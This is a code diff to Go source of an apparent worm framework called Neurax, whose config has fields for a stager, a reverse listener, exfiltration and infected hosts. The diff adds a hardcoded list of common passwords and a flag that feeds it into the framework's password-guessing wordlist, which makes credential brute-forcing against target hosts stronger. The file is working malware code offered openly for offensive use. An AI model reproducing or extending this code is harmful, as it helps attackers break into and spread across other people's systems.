@@ -25,6 +25,47 @@ import (
 
 var InfectedHosts = []string{}
 var ReceivedCommands = []string{}
+var CommonPasswords = []string{
+	"123456",
+	"123456789",
+	"password",
+	"qwerty",
+	"12345678",
+	"12345",
+	"123123",
+	"111111",
+	"1234",
+	"1234567890",
+	"1234567",
+	"abc123",
+	"1q2w3e4r5t",
+	"q1w2e3r4t5y6",
+	"iloveyou",
+	"123",
+	"000000",
+	"123321",
+	"1q2w3e4r",
+	"qwertyuiop",
+	"yuantuo2012",
+	"654321",
+	"qwerty123",
+	"1qaz2wsx3edc",
+	"password1",
+	"1qaz2wsx",
+	"666666",
+	"dragon",
+	"ashley",
+	"princess",
+	"987654321",
+	"123qwe",
+	"159753",
+	"monkey",
+	"q1w2e3r4",
+	"zxcvbnm",
+	"123123123",
+	"asdfghjkl",
+	"pokemon",
+	"football"}
 
 type __NeuraxConfig struct {
 	Stager          string
@@ -52,6 +93,7 @@ type __NeuraxConfig struct {
 	PreventReexec   bool
 	ExfilAddr       string
 	WordlistExpand  bool
+	WordlistCommon  bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -79,7 +121,8 @@ var NeuraxConfig = __NeuraxConfig{
 	ReverseListener: "none",
 	PreventReexec:   true,
 	ExfilAddr:       "none",
-	ExpandWordlist:  false,
+	WordlistExpand:  false,
+	WordlistCommon:  false,
 }
 
 //Verbose error printing
@@ -572,6 +615,9 @@ func NeuraxWordlist(words []string) []string {
 			wordlist = append(wordlist, WordEncapsule(word)...)
 			wordlist = append(wordlist, WordCyryllicReplace(word)...)
 			wordlist = append(wordlist, WordSingleUpperTransform(word)...)
+		}
+		if NeuraxConfig.WordlistCommon {
+			wordlist = append(wordlist, CommonPasswords...)
 		}
 	}
 	return wordlist
